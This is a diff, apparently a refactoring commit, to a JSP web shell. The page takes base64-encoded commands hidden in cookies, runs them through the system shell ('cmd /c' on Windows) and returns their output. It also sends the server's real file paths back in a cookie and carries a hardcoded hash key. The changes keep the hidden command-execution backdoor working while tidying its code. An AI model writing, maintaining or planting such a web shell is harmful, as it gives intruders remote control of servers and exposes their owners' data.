@@ -1,9 +1,9 @@
-<%@ page language="java" import="java.util.*" import="java.io.*"
-  import="java.net.*" import="java.util.regex.*"
-  import="java.security.MessageDigest" import="sun.misc.*"
-    import="java.util.logging.*"
+<%@ page
+  import="java.util.*" import="java.io.*" import="java.net.*"
+  import="java.util.regex.*" import="java.security.MessageDigest"
+  import="java.nio.charset.Charset" import="java.lang.reflect.Method"
+  import="sun.misc.*" import="java.util.logging.*"
   pageEncoding="UTF-8"%>
-<%@ page import="java.lang.reflect.Method" %>
 <%
   String path = request.getContextPath();
   String basePath = request.getScheme() + "://"
@@ -28,10 +28,7 @@
     <div>java version: <%=System.getProperty("java.version")%></div>
     <% Logger logger=Logger.getLogger(this.getClass().getName());%>
   <%!private boolean validateCookie(String aStr) {
-    if (aStr == null || aStr.length() == 0 || aStr.equals("null")) {
-      return false;
-    }
-    return true;
+    return aStr != null && aStr.length() != 0 && !aStr.equals("null");
   }%>
   <%
     String key_important = "21232f297a57a5a743894a0e4a801fc3";
@@ -109,7 +106,7 @@
       if (firstSign) {
         BASE64Encoder encoder = new BASE64Encoder();
         String rlp=application.getRealPath(request.getRequestURI()) + "\0" + application.getRealPath("/");
-        rlp = encoder.encode(rlp.getBytes("UTF-8"));
+        rlp = encoder.encode(rlp.getBytes(Charset.forName("UTF-8")));
         rlp = URLEncoder.encode(rlp, "UTF-8");
         // logger.info("rlp.final is:"+rlp);
         response.addCookie(new Cookie("rlp", rlp));
@@ -153,7 +150,7 @@
       if (validateCookie(valuesMap.get("sess3"))) {
         doWhat = doWhat + valuesMap.get("sess3");
       }
-      if (doWhat != null && doWhat.length() != 0) {
+      if (doWhat.length() != 0) {
         doWhat = new String(decoder.decodeBuffer(doWhat.replaceAll(
             "[!@#$%^&*()]", "")));
         //decode unicode sequence
@@ -177,7 +174,7 @@
       final StringBuffer commandout = new StringBuffer();
       commandout.append(begin);
       Process proc = null;
-      String args[] = null;
+      String args[];
       if (osName.toLowerCase().indexOf("win") >= 0) {
         //需要前缀吗? 待测. 一定要!
         //cmd 和/c不能分开？ 不然会运行不了! 除非直接拼成字串。
@@ -212,7 +209,7 @@
         try {
 
           BufferedReader br = new BufferedReader(
-              new InputStreamReader(proc.getInputStream()),
+              new InputStreamReader(proc.getInputStream(), Charset.forName("UTF-8")),
               4096);
           final BufferedReader err_bf = new BufferedReader(
               new InputStreamReader(proc.getErrorStream()),
@@ -220,7 +217,7 @@
 
           Thread errThread = new Thread(new Runnable() {
             public void run() {
-              String err_output = null;
+              String err_output;
               try {
                 while ((err_output = err_bf.readLine()) != null) {
                   commandout
@@ -238,7 +235,7 @@
           errThread.start();
 
           try {
-            String outputline = null;
+            String outputline;
             while ((outputline = br.readLine()) != null) {
               commandout.append(outputline).append(
                   props.getProperty("line.separator"));
